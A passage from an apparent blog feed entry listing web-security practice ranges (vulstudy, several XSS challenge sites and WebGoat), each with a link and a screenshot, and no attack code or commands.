-<p><strong>4、vulstudy</strong></p>
-<p><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-17.png" alt="图片"></p>
-<p><strong>5、XSS – game</strong></p>
-<p><a href="https://xss.haozi.me/#/0x00">https://xss.haozi.me/#/0x00</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-18.png" alt="图片"></p>
-<p><a href="http://www.domxss.com/domxss/domxss.php">http://www.domxss.com/domxss/domxss.php</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-19.png" alt="图片"></p>
-<p><a href="http://prompt.ml/0">http://prompt.ml/0</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-20.png" alt="图片"></p>
-<p>6、WebGoat</p>
-<p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-21.png" alt="图片"></p>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
   </entry>
 </search>
